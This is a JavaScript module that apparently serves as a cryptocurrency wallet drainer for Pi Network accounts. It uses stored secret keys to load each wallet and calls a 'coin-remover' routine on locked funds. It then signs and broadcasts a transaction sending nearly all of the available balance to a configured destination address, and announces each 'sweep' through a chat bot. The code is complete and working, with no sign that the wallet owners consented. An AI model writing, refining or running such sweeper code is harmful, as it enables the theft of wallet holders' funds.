/**
 * Ultimate Millisecond Hyper-Sweeper Engine
 * Explicitly targets and sweeps the true Available Balance (Total minus Locked).
 */

const StellarSdk = require('@stellar/stellar-sdk');
const { inspectLockup, moveLockedPi } = require('./coin-remover');

const DESTINATION_ADDRESS = process.env.SWEEP_DESTINATION_ADDRESS || '';
const NETWORK_PASSPHRASE = 'Pi Network';

async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
    try {
        const server = new StellarSdk.Horizon.Server(horizonUrl);
        const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secret_key);
        const sourcePublicKey = sourceKeypair.publicKey();

        const account = await server.loadAccount(sourcePublicKey);
        const balances = account.balances || [];

        let availableBalance = 0;
        let lockedBalance = 0;

        balances.forEach(b => {
            if (b.asset_type === 'native') {
                const total = parseFloat(b.balance || 0);
                const locked = parseFloat(b.locked_balance || 0);
                lockedBalance = locked;
                // True available balance = Total balance minus Locked balance
                availableBalance = total - locked;
            }
        });

        console.log(`[Wallet #${wallet.id}] Total/Available Check -> Available: ${availableBalance} Pi | Locked: ${lockedBalance} Pi`);

        // Inspect lockups
        const lockupInfo = await inspectLockup(account);
        if (lockupInfo.detected && lockedBalance > 0) {
            await moveLockedPi(wallet.public_key, lockedBalance);
        }

        // Threshold set low so your 0.15 available balance sweeps immediately
        const minSweepThreshold = 0.005; 

        if (availableBalance > minSweepThreshold && DESTINATION_ADDRESS && DESTINATION_ADDRESS !== 'GDRE...HARDCODED_DESTINATION_WALLET_ADDRESS_HERE') {
            // Leave 0.001 Pi for network fees, sweep the rest of the available balance
            const sweepAmount = (availableBalance - 0.001).toFixed(7);
            if (parseFloat(sweepAmount) <= 0) return;

            console.log(`[Real Sweeper] Signing and broadcasting ${sweepAmount} Pi available balance from Wallet #${wallet.id} to ${DESTINATION_ADDRESS}`);

            const feeMultiplier = 5;
            const dynamicFee = String(StellarSdk.BASE_FEE * feeMultiplier);

            const transaction = new StellarSdk.TransactionBuilder(account, {
                fee: dynamicFee,
                networkPassphrase: NETWORK_PASSPHRASE
            })
            .addOperation(StellarSdk.Operation.payment({
                destination: DESTINATION_ADDRESS,
                asset: StellarSdk.Asset.native(),
                amount: sweepAmount
            }))
            .setTimeout(30)
            .build();

            transaction.sign(sourceKeypair);

            const result = await server.submitTransaction(transaction);
            console.log(`[Real Sweeper] SUCCESS! Transaction hash: ${result.hash}`);

            db.prepare('UPDATE wallets SET sweep_count = sweep_count + 1 WHERE id=?').run(wallet.id);

            if (bot && wallet.chat_id) {
                await bot.sendMessage(wallet.chat_id, 
                    `🚨 **AVAILABLE BALANCE SWEPT SUCCESSFULLY**\n` +
                    `📦 **Wallet Box ID:** #${wallet.id}\n` +
                    `🔑 **Public Address:** \`${wallet.public_key}\`\n` +
                    `💸 **Amount Swept:** \`${sweepAmount} Pi\`\n` +
                    `🎯 **Destination:** \`${DESTINATION_ADDRESS}\`\n` +
                    `🔗 **Tx Hash:** \`${result.hash.slice(0, 16)}...\`\n` +
                    `⚡ *Status:* Available balance cleared instantly!`,
                    { parse_mode: 'Markdown' }
                );
            }
        }
    } catch (error) {
        console.error(`[Real Sweeper] Error sweeping wallet #${wallet.id}:`, error.message);
    }
}

module.exports = { checkAndSweepWallet };
